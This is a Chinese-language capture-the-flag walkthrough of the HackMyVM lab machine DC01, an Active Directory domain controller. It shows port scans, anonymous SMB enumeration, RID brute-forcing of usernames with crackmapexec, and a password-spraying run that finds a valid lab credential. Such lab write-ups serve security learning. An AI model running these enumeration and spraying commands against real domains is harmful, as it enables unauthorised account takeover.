<li data-line="4" dir="auto"><a data-tooltip-position="top" aria-label="5. hashcat破解" data-href="#5. hashcat破解" href="#5._hashcat破解" class="internal-link" target="_self" rel="noopener nofollow">5. hashcat破解</a></li>
<li data-line="5" dir="auto"><a data-tooltip-position="top" aria-label="6. smb检测一下" data-href="#6. smb检测一下" href="#6._smb检测一下" class="internal-link" target="_self" rel="noopener nofollow">6. smb检测一下</a></li>
<li data-line="6" dir="auto"><a data-tooltip-position="top" aria-label="7. smbclient连接" data-href="#7. smbclient连接" href="#7._smbclient连接" class="internal-link" target="_self" rel="noopener nofollow">7. smbclient连接</a></li>
<li data-line="7" dir="auto"><a data-tooltip-position="top" aria-label="8. WinRM 连接DC01" data-href="#8. WinRM 连接DC01" href="#8._WinRM_连接DC01" class="internal-link" target="_self" rel="noopener nofollow">8. WinRM 连接DC01</a></li>
</ul></div><div class="el-pre" data-tag-name="pre"><pre><code data-line="0">靶机链接：https://hackmyvm.eu/machines/machine.php?vm=DC01
</code><button class="copy-code-button"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon lucide-copy"><rect x="8" y="8" width="14" height="14" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg></button></pre></div><div class="el-p" data-tag-name="p"><p dir="auto"><a data-tooltip-position="top" aria-label="https://hackmyvm.eu/profile/?user=josemlwdf" rel="noopener nofollow" class="external-link" href="https://hackmyvm.eu/profile/?user=josemlwdf" target="_blank">josemlwdf</a></p></div><div class="el-pre" data-tag-name="pre"><pre><code data-line="0">难度：⭐️⭐️⭐️⭐️
</code><button class="copy-code-button"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon lucide-copy"><rect x="8" y="8" width="14" height="14" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg></button></pre></div><div class="el-pre" data-tag-name="pre"><pre><code data-line="0">知识点：SMB匿名登录、RID枚举、SPN
</code><button class="copy-code-button"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon lucide-copy"><rect x="8" y="8" width="14" height="14" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg></button></pre></div><div class="el-pre" data-tag-name="pre"><pre><code data-line="0">好久没打windwos靶机了。这是我在hackmyvm上打的第一个windows靶机
</code><button class="copy-code-button"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon lucide-copy"><rect x="8" y="8" width="14" height="14" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg></button></pre></div></div></div><div class="el-h2 heading-wrapper" data-heading="2. 信息收集" data-tag-name="h2"><h2 data-heading="2. 信息收集" dir="auto" class="heading" id="2._信息收集"><div class="heading-collapse-indicator collapse-indicator collapse-icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon right-triangle"><path d="M3 8L12 17L21 8"></path></svg></div>2. 信息收集</h2><div class="heading-children"><div class="el-pre" data-tag-name="pre"><pre class="language-powershell" tabindex="0"><code data-line="0" class="language-powershell is-loaded">192<span class="token punctuation">.</span>168<span class="token punctuation">.</span>56<span class="token punctuation">.</span>128:445 open
192<span class="token punctuation">.</span>168<span class="token punctuation">.</span>56<span class="token punctuation">.</span>128:88 open
192<span class="token punctuation">.</span>168<span class="token punctuation">.</span>56<span class="token punctuation">.</span>128:139 open
192<span class="token punctuation">.</span>168<span class="token punctuation">.</span>56<span class="token punctuation">.</span>128:135 open
<span class="token punctuation">[</span>\<span class="token operator">*</span><span class="token punctuation">]</span> alive ports len is: 4
<span class="token function">start</span> vulscan
<span class="token punctuation">[</span>\<span class="token operator">*</span><span class="token punctuation">]</span> NetBios 192<span class="token punctuation">.</span>168<span class="token punctuation">.</span>56<span class="token punctuation">.</span>128  <span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> DC:SOUPEDECODE\DC01
<span class="token punctuation">[</span>\<span class="token operator">*</span><span class="token punctuation">]</span> NetInfo
<span class="token punctuation">[</span>\<span class="token operator">*</span><span class="token punctuation">]</span>192<span class="token punctuation">.</span>168<span class="token punctuation">.</span>56<span class="token punctuation">.</span>128
   <span class="token punctuation">[</span><span class="token operator">-</span>&gt;<span class="token punctuation">]</span>DC01
   <span class="token punctuation">[</span><span class="token operator">-</span>&gt;<span class="token punctuation">]</span>192<span class="token punctuation">.</span>168<span class="token punctuation">.</span>56<span class="token punctuation">.</span>128
</code><button class="copy-code-button"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon lucide-copy"><rect x="8" y="8" width="14" height="14" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg></button></pre></div><div class="el-pre" data-tag-name="pre"><pre class="language-powershell" tabindex="0"><code data-line="0" class="language-powershell is-loaded">nmap <span class="token operator">-</span><span class="token function">sC</span> <span class="token operator">-</span><span class="token function">sV</span> 192<span class="token punctuation">.</span>168<span class="token punctuation">.</span>56<span class="token punctuation">.</span>128 <span class="token operator">-</span>p-
Starting Nmap 7<span class="token punctuation">.</span>94SVN <span class="token punctuation">(</span> https:<span class="token operator">/</span><span class="token operator">/</span>nmap<span class="token punctuation">.</span>org <span class="token punctuation">)</span> at 2024-11-19 13:03 CST
Nmap scan report <span class="token keyword">for</span> 192<span class="token punctuation">.</span>168<span class="token punctuation">.</span>56<span class="token punctuation">.</span>128
Host is up <span class="token punctuation">(</span>0<span class="token punctuation">.</span>00030s latency<span class="token punctuation">)</span><span class="token punctuation">.</span>
Not shown: 65517 filtered tcp ports <span class="token punctuation">(</span>no-response<span class="token punctuation">)</span>
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos <span class="token punctuation">(</span>server time: 2024-11-19 20:05:09Z<span class="token punctuation">)</span>
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP <span class="token punctuation">(</span>Domain: SOUPEDECODE<span class="token punctuation">.</span>LOCAL0<span class="token punctuation">.</span><span class="token punctuation">,</span> Site: Default-First-Site-Name<span class="token punctuation">)</span>
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn\_http    Microsoft Windows RPC over HTTP 1<span class="token punctuation">.</span>0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP <span class="token punctuation">(</span>Domain: SOUPEDECODE<span class="token punctuation">.</span>LOCAL0<span class="token punctuation">.</span><span class="token punctuation">,</span> Site: Default-First-Site-Name<span class="token punctuation">)</span>
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2<span class="token punctuation">.</span>0 <span class="token punctuation">(</span>SSDP/UPnP<span class="token punctuation">)</span>
<span class="token punctuation">|</span>\_http-title: Not Found
<span class="token punctuation">|</span>\_http-server-header: Microsoft-HTTPAPI/2<span class="token punctuation">.</span>0
9389/tcp  open  mc-nmf        <span class="token punctuation">.</span>NET Message Framing
49664/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49676/tcp open  ncacn\_http    Microsoft Windows RPC over HTTP 1<span class="token punctuation">.</span>0
49689/tcp open  msrpc         Microsoft Windows RPC
49709/tcp open  msrpc         Microsoft Windows RPC
MAC Address: 08:00:27:08:32:AA <span class="token punctuation">(</span>Oracle VirtualBox virtual NIC<span class="token punctuation">)</span>
Service Info: Host: DC01<span class="token punctuation">;</span> OS: Windows<span class="token punctuation">;</span> CPE: cpe:<span class="token operator">/</span>o:microsoft:windows

Host script results:
<span class="token punctuation">|</span> smb2-security-mode:
<span class="token punctuation">|</span>   3:1:1:
<span class="token punctuation">|</span>\_    Message signing enabled and required
<span class="token punctuation">|</span>\_nbstat: NetBIOS name: DC01<span class="token punctuation">,</span> NetBIOS user: &lt;unknown&gt;<span class="token punctuation">,</span> NetBIOS MAC: 08:00:27:08:32:aa <span class="token punctuation">(</span>Oracle VirtualBox virtual NIC<span class="token punctuation">)</span>
<span class="token punctuation">|</span> smb2-time:
<span class="token punctuation">|</span>   date: 2024-11-19T20:05:57
<span class="token punctuation">|</span>\_  <span class="token function">start</span>\_date: N/A
<span class="token punctuation">|</span>\_clock-skew: 14h59m58s
</code><button class="copy-code-button"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon lucide-copy"><rect x="8" y="8" width="14" height="14" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg></button></pre></div><div class="el-p" data-tag-name="p"><p dir="auto">可以发现目标运行的服务有Kerberos、LDAP、SMB 这些都是windows域控的特征</p></div><div class="el-pre" data-tag-name="pre"><pre class="language-powershell" tabindex="0"><code data-line="0" class="language-powershell is-loaded">域名 SOUPEDECODE 
</code><button class="copy-code-button"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon lucide-copy"><rect x="8" y="8" width="14" height="14" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg></button></pre></div><div class="el-p" data-tag-name="p"><p dir="auto">先把域名配置进/etc/hosts</p></div><div class="el-pre" data-tag-name="pre"><pre class="language-powershell" tabindex="0"><code data-line="0" class="language-powershell is-loaded">192<span class="token punctuation">.</span>168<span class="token punctuation">.</span>56<span class="token punctuation">.</span>128 SOUPEDECODE<span class="token punctuation">.</span>LOCAL DC01<span class="token punctuation">.</span>SOUPEDECODE<span class="token punctuation">.</span>LOCAL
</code><button class="copy-code-button"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon lucide-copy"><rect x="8" y="8" width="14" height="14" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg></button></pre></div></div></div><div class="el-h2 heading-wrapper" data-heading="3. SMB" data-tag-name="h2"><h2 data-heading="3. SMB" dir="auto" class="heading" id="3._SMB"><div class="heading-collapse-indicator collapse-indicator collapse-icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon right-triangle"><path d="M3 8L12 17L21 8"></path></svg></div>3. SMB</h2><div class="heading-children"><div class="el-p" data-tag-name="p"><p dir="auto">作者开放了139 445端口，很明显的SMB特征</p></div><div class="el-p" data-tag-name="p"><p dir="auto">利用smbmap 枚举SMB服务 检测是否存在匿名登录或者来宾登录</p></div><div class="el-pre" data-tag-name="pre"><pre class="language-powershell" tabindex="0"><code data-line="0" class="language-powershell is-loaded">smbmap <span class="token operator">-</span>u anonymous <span class="token operator">-</span>H SOUPEDECODE<span class="token punctuation">.</span>LOCAL

    \_\_\_\_\_\_\_\_  \_\_\_      \_\_\_  \_\_\_\_\_\_\_   \_\_\_      \_\_\_       \_\_         \_\_\_\_\_\_\_
   <span class="token operator">/</span><span class="token string">"       )|"</span>  \    <span class="token operator">/</span><span class="token string">"  ||   \_  "</span>\ <span class="token punctuation">|</span><span class="token string">"  \    /"</span>  <span class="token punctuation">|</span>     <span class="token operator">/</span><span class="token string">""</span>\       <span class="token punctuation">|</span>   \_\_ <span class="token string">"\
  (:   \\_\_\_/  \   \  //   |(. |\_)  :) \   \  //   |    /    \      (. |\_\_) :)
   \\_\_\_  \    /\  \/.    ||:     \/   /\   \/.    |   /' /\  \     |:  \_\_\_\_/
    \_\_/  \   |: \.        |(|  \_  \  |: \.        |  //  \_\_'  \    (|  /
   /"</span> \   :<span class="token punctuation">)</span> <span class="token punctuation">|</span><span class="token punctuation">.</span>  \    <span class="token operator">/</span>:  <span class="token punctuation">|</span><span class="token punctuation">|</span>: <span class="token punctuation">|</span>\_<span class="token punctuation">)</span>  :<span class="token punctuation">)</span><span class="token punctuation">|</span><span class="token punctuation">.</span>  \    <span class="token operator">/</span>:  <span class="token punctuation">|</span> <span class="token operator">/</span>   <span class="token operator">/</span>  \   \  <span class="token operator">/</span><span class="token punctuation">|</span>\_\_/ \
  <span class="token punctuation">(</span>\_\_\_\_\_\_\_/  <span class="token punctuation">|</span>\_\_\_<span class="token punctuation">|</span>\\_\_/<span class="token punctuation">|</span>\_\_\_<span class="token punctuation">|</span><span class="token punctuation">(</span>\_\_\_\_\_\_\_/ <span class="token punctuation">|</span>\_\_\_<span class="token punctuation">|</span>\\_\_/<span class="token punctuation">|</span>\_\_\_<span class="token punctuation">|</span><span class="token punctuation">(</span>\_\_\_/    \\_\_\_<span class="token punctuation">)</span><span class="token punctuation">(</span>\_\_\_\_\_\_\_<span class="token punctuation">)</span>
 <span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span>
     SMBMap <span class="token operator">-</span> Samba Share Enumerator <span class="token punctuation">|</span> Shawn Evans <span class="token operator">-</span> ShawnDEvans@gmail<span class="token punctuation">.</span>com
                     https:<span class="token operator">/</span><span class="token operator">/</span>github<span class="token punctuation">.</span>com/ShawnDEvans/smbmap

<span class="token punctuation">[</span>\<span class="token operator">*</span><span class="token punctuation">]</span> Detected 1 hosts serving SMB
<span class="token punctuation">[</span>\<span class="token operator">*</span><span class="token punctuation">]</span> Established 1 SMB session<span class="token punctuation">(</span>s<span class="token punctuation">)</span>
                                                                                              
<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> IP: 192<span class="token punctuation">.</span>168<span class="token punctuation">.</span>56<span class="token punctuation">.</span>128:445      Name: soupedcode<span class="token punctuation">.</span>loacl          Status: Authenticated
        Disk                                                    Permissions     Comment
        <span class="token operator">--</span><span class="token operator">--</span>                                                    <span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span>     <span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span>
        ADMIN$                                                  NO ACCESS       Remote Admin
        backup                                                  NO ACCESS
        C$                                                      NO ACCESS       Default share
        IPC$                                                    READ ONLY       Remote IPC
        NETLOGON                                                NO ACCESS       Logon server share
        SYSVOL                                                  NO ACCESS       Logon server share
        Users                                                   NO ACCESS
</code><button class="copy-code-button"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon lucide-copy"><rect x="8" y="8" width="14" height="14" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg></button></pre></div><div class="el-p" data-tag-name="p"><p dir="auto">发现 IPC$  是可以读取的</p></div><div class="el-p" data-tag-name="p"><p dir="auto">发现是可以匿名登录的，我们可以利用这个用户 进行相对标识符（RID）暴力枚举出域内的其他用户</p></div><div class="el-pre" data-tag-name="pre"><pre class="language-powershell" tabindex="0"><code data-line="0" class="language-powershell is-loaded">crackmapexec smb SOUPEDECODE<span class="token punctuation">.</span>LOCAL <span class="token operator">-</span>u <span class="token string">'anonymous'</span> <span class="token operator">-</span>p <span class="token string">''</span> <span class="token operator">--</span>rid-brute &gt; rid_bruteforce<span class="token punctuation">.</span>txt

<span class="token function">cat</span> rid\_bruteforce<span class="token punctuation">.</span>txt <span class="token punctuation">|</span> grep SidTypeUser <span class="token punctuation">|</span> cut <span class="token operator">-</span>d <span class="token string">'\'</span> <span class="token operator">-</span>f2 <span class="token punctuation">|</span> cut <span class="token operator">-</span>d <span class="token string">' '</span> <span class="token operator">-</span>f1 &gt; valid\_users<span class="token punctuation">.</span>txt
</code><button class="copy-code-button"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon lucide-copy"><rect x="8" y="8" width="14" height="14" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg></button></pre></div><div class="el-p" data-tag-name="p"><p dir="auto">通过rid枚举 获取了1000多个用户名</p></div><div class="el-p" data-tag-name="p"><p dir="auto">ASREPRoasting 攻击</p></div><div class="el-p" data-tag-name="p"><p dir="auto">我们可以利用这些用户进行ASREPRoasting 攻击，但是都失败了。因为所有这些帐户都设置了 Kerberos 预身份验证所需的属性</p></div></div></div><div class="el-h2 heading-wrapper" data-heading="4. SMB密码喷射" data-tag-name="h2"><h2 data-heading="4. SMB密码喷射" dir="auto" class="heading" id="4._SMB密码喷射"><div class="heading-collapse-indicator collapse-indicator collapse-icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon right-triangle"><path d="M3 8L12 17L21 8"></path></svg></div>4. SMB密码喷射</h2><div class="heading-children"><div class="el-pre" data-tag-name="pre"><pre class="language-powershell" tabindex="0"><code data-line="0" class="language-powershell is-loaded">┌──<span class="token punctuation">(</span>root㉿kali<span class="token punctuation">)</span><span class="token operator">-</span><span class="token punctuation">[</span><span class="token operator">/</span>home/kali/hmv/DC01<span class="token punctuation">]</span>
└─<span class="token comment"># crackmapexec smb SOUPEDECODE.LOCAL -u valid\_users.txt -p valid\_users.txt  --no-bruteforce</span>
SMB         SOUPEDECODE<span class="token punctuation">.</span>LOCAL 445    DC01             <span class="token punctuation">[</span>\<span class="token operator">*</span><span class="token punctuation">]</span> Windows Server 2022 Build 20348 x64 <span class="token punctuation">(</span>name:DC01<span class="token punctuation">)</span> <span class="token punctuation">(</span>domain:SOUPEDECODE<span class="token punctuation">.</span>LOCAL<span class="token punctuation">)</span> <span class="token punctuation">(</span>signing:True<span class="token punctuation">)</span> <span class="token punctuation">(</span>SMBv1:False<span class="token punctuation">)</span>
SMB         SOUPEDECODE<span class="token punctuation">.</span>LOCAL 445    DC01             <span class="token punctuation">[</span><span class="token operator">-</span><span class="token punctuation">]</span> SOUPEDECODE<span class="token punctuation">.</span>LOCAL\Administrator:Administrator STATUS\_LOGON\_FAILURE
SMB         SOUPEDECODE<span class="token punctuation">.</span>LOCAL 445    DC01             <span class="token punctuation">[</span><span class="token operator">-</span><span class="token punctuation">]</span> SOUPEDECODE<span class="token punctuation">.</span>LOCAL\Guest:Guest STATUS\_LOGON\_FAILURE
SMB         SOUPEDECODE<span class="token punctuation">.</span>LOCAL 445    DC01             <span class="token punctuation">[</span><span class="token operator">-</span><span class="token punctuation">]</span> SOUPEDECODE<span class="token punctuation">.</span>LOCAL\krbtgt:krbtgt STATUS\_LOGON\_FAILURE
SMB         SOUPEDECODE<span class="token punctuation">.</span>LOCAL 445    DC01             <span class="token punctuation">[</span><span class="token operator">-</span><span class="token punctuation">]</span> SOUPEDECODE<span class="token punctuation">.</span>LOCAL\DC01$:DC01$ STATUS\_LOGON\_FAILURE
SMB         SOUPEDECODE<span class="token punctuation">.</span>LOCAL 445    DC01             <span class="token punctuation">[</span><span class="token operator">-</span><span class="token punctuation">]</span> SOUPEDECODE<span class="token punctuation">.</span>LOCAL\bmark0:bmark0 STATUS\_LOGON\_FAILURE
SMB         SOUPEDECODE<span class="token punctuation">.</span>LOCAL 445    DC01             <span class="token punctuation">[</span><span class="token operator">-</span><span class="token punctuation">]</span> SOUPEDECODE<span class="token punctuation">.</span>LOCAL\otara1:otara1 STATUS\_LOGON\_FAILURE
SMB         SOUPEDECODE<span class="token punctuation">.</span>LOCAL 445    DC01             <span class="token punctuation">[</span><span class="token operator">-</span><span class="token punctuation">]</span> SOUPEDECODE<span class="token punctuation">.</span>LOCAL\kleo2:kleo2 STATUS\_LOGON\_FAILURE
SMB         SOUPEDECODE<span class="token punctuation">.</span>LOCAL 445    DC01             <span class="token punctuation">[</span><span class="token operator">-</span><span class="token punctuation">]</span> SOUPEDECODE<span class="token punctuation">.</span>LOCAL\eyara3:eyara3 STATUS\_LOGON\_FAILURE
SMB         SOUPEDECODE<span class="token punctuation">.</span>LOCAL 445    DC01             <span class="token punctuation">[</span><span class="token operator">-</span><span class="token punctuation">]</span> SOUPEDECODE<span class="token punctuation">.</span>LOCAL\pquinn4:pquinn4 STATUS\_LOGON\_FAILURE
SMB         SOUPEDECODE<span class="token punctuation">.</span>LOCAL 445    DC01             <span class="token punctuation">[</span><span class="token operator">-</span><span class="token punctuation">]</span> SOUPEDECODE<span class="token punctuation">.</span>LOCAL\jharper5:jharper5 STATUS\_LOGON\_FAILURE
SMB         SOUPEDECODE<span class="token punctuation">.</span>LOCAL 445    DC01             <span class="token punctuation">[</span><span class="token operator">-</span><span class="token punctuation">]</span> SOUPEDECODE<span class="token punctuation">.</span>LOCAL\bxenia6:bxenia6 STATUS\_LOGON\_FAILURE
SMB         SOUPEDECODE<span class="token punctuation">.</span>LOCAL 445    DC01             <span class="token punctuation">[</span><span class="token operator">-</span><span class="token punctuation">]</span> SOUPEDECODE<span class="token punctuation">.</span>LOCAL\gmona7:gmona7 STATUS\_LOGON\_FAILURE
SMB         SOUPEDECODE<span class="token punctuation">.</span>LOCAL 445    DC01             <span class="token punctuation">[</span><span class="token operator">-</span><span class="token punctuation">]</span> SOUPEDECODE<span class="token punctuation">.</span>LOCAL\oaaron8:oaaron8 STATUS\_LOGON\_FAILURE
SMB         SOUPEDECODE<span class="token punctuation">.</span>LOCAL 445    DC01             <span class="token punctuation">[</span><span class="token operator">-</span><span class="token punctuation">]</span> SOUPEDECODE<span class="token punctuation">.</span>LOCAL\pleo9:pleo9 STATUS\_LOGON\_FAILURE
SMB         SOUPEDECODE<span class="token punctuation">.</span>LOCAL 445    DC01             <span class="token punctuation">[</span><span class="token operator">-</span><span class="token punctuation">]</span> SOUPEDECODE<span class="token punctuation">.</span>LOCAL\evictor10:evictor10 STATUS\_LOGON\_FAILURE
SMB         SOUPEDECODE<span class="token punctuation">.</span>LOCAL 445    DC01             <span class="token punctuation">[</span><span class="token operator">-</span><span class="token punctuation">]</span> SOUPEDECODE<span class="token punctuation">.</span>LOCAL\wreed11:wreed11 STATUS\_LOGON\_FAILURE
SMB         SOUPEDECODE<span class="token punctuation">.</span>LOCAL 445    DC01             <span class="token punctuation">[</span><span class="token operator">-</span><span class="token punctuation">]</span> SOUPEDECODE<span class="token punctuation">.</span>LOCAL\bgavin12:bgavin12 STATUS\_LOGON\_FAILURE
SMB         SOUPEDECODE<span class="token punctuation">.</span>LOCAL 445    DC01             <span class="token punctuation">[</span><span class="token operator">-</span><span class="token punctuation">]</span> SOUPEDECODE<span class="token punctuation">.</span>LOCAL\ndelia13:ndelia13 STATUS\_LOGON\_FAILURE
SMB         SOUPEDECODE<span class="token punctuation">.</span>LOCAL 445    DC01             <span class="token punctuation">[</span><span class="token operator">-</span><span class="token punctuation">]</span> SOUPEDECODE<span class="token punctuation">.</span>LOCAL\akevin14:akevin14 STATUS\_LOGON\_FAILURE
SMB         SOUPEDECODE<span class="token punctuation">.</span>LOCAL 445    DC01             <span class="token punctuation">[</span><span class="token operator">-</span><span class="token punctuation">]</span> SOUPEDECODE<span class="token punctuation">.</span>LOCAL\kxenia15:kxenia15 STATUS\_LOGON\_FAILURE
SMB         SOUPEDECODE<span class="token punctuation">.</span>LOCAL 445    DC01             <span class="token punctuation">[</span><span class="token operator">-</span><span class="token punctuation">]</span> SOUPEDECODE<span class="token punctuation">.</span>LOCAL\ycody16:ycody16 STATUS\_LOGON\_FAILURE
SMB         SOUPEDECODE<span class="token punctuation">.</span>LOCAL 445    DC01             <span class="token punctuation">[</span><span class="token operator">-</span><span class="token punctuation">]</span> SOUPEDECODE<span class="token punctuation">.</span>LOCAL\qnora17:qnora17 STATUS\_LOGON\_FAILURE
SMB         SOUPEDECODE<span class="token punctuation">.</span>LOCAL 445    DC01             <span class="token punctuation">[</span><span class="token operator">-</span><span class="token punctuation">]</span> SOUPEDECODE<span class="token punctuation">.</span>LOCAL\dyvonne18:dyvonne18 STATUS\_LOGON\_FAILURE
SMB         SOUPEDECODE<span class="token punctuation">.</span>LOCAL 445    DC01             <span class="token punctuation">[</span><span class="token operator">-</span><span class="token punctuation">]</span> SOUPEDECODE<span class="token punctuation">.</span>LOCAL\qxenia19:qxenia19 STATUS\_LOGON\_FAILURE
SMB         SOUPEDECODE<span class="token punctuation">.</span>LOCAL 445    DC01             <span class="token punctuation">[</span><span class="token operator">-</span><span class="token punctuation">]</span> SOUPEDECODE<span class="token punctuation">.</span>LOCAL\rreed20:rreed20 STATUS\_LOGON\_FAILURE
SMB         SOUPEDECODE<span class="token punctuation">.</span>LOCAL 445    DC01             <span class="token punctuation">[</span><span class="token operator">-</span><span class="token punctuation">]</span> SOUPEDECODE<span class="token punctuation">.</span>LOCAL\icody21:icody21 STATUS\_LOGON\_FAILURE
SMB         SOUPEDECODE<span class="token punctuation">.</span>LOCAL 445    DC01             <span class="token punctuation">[</span><span class="token operator">-</span><span class="token punctuation">]</span> SOUPEDECODE<span class="token punctuation">.</span>LOCAL\ftom22:ftom22 STATUS\_LOGON\_FAILURE
SMB         SOUPEDECODE<span class="token punctuation">.</span>LOCAL 445    DC01             <span class="token punctuation">[</span><span class="token operator">-</span><span class="token punctuation">]</span> SOUPEDECODE<span class="token punctuation">.</span>LOCAL\ijake23:ijake23 STATUS\_LOGON\_FAILURE
SMB         SOUPEDECODE<span class="token punctuation">.</span>LOCAL 445    DC01             <span class="token punctuation">[</span><span class="token operator">-</span><span class="token punctuation">]</span> SOUPEDECODE<span class="token punctuation">.</span>LOCAL\rpenny24:rpenny24 STATUS\_LOGON\_FAILURE
SMB         SOUPEDECODE<span class="token punctuation">.</span>LOCAL 445    DC01             <span class="token punctuation">[</span><span class="token operator">-</span><span class="token punctuation">]</span> SOUPEDECODE<span class="token punctuation">.</span>LOCAL\jiris25:jiris25 STATUS\_LOGON\_FAILURE
SMB         SOUPEDECODE<span class="token punctuation">.</span>LOCAL 445    DC01             <span class="token punctuation">[</span><span class="token operator">-</span><span class="token punctuation">]</span> SOUPEDECODE<span class="token punctuation">.</span>LOCAL\colivia26:colivia26 STATUS\_LOGON\_FAILURE
SMB         SOUPEDECODE<span class="token punctuation">.</span>LOCAL 445    DC01             <span class="token punctuation">[</span><span class="token operator">-</span><span class="token punctuation">]</span> SOUPEDECODE<span class="token punctuation">.</span>LOCAL\pyvonne27:pyvonne27 STATUS\_LOGON\_FAILURE
SMB         SOUPEDECODE<span class="token punctuation">.</span>LOCAL 445    DC01             <span class="token punctuation">[</span><span class="token operator">-</span><span class="token punctuation">]</span> SOUPEDECODE<span class="token punctuation">.</span>LOCAL\zfrank28:zfrank28 STATUS\_LOGON\_FAILURE
SMB         SOUPEDECODE<span class="token punctuation">.</span>LOCAL 445    DC01             <span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> SOUPEDECODE<span class="token punctuation">.</span>LOCAL\ybob317:ybob317
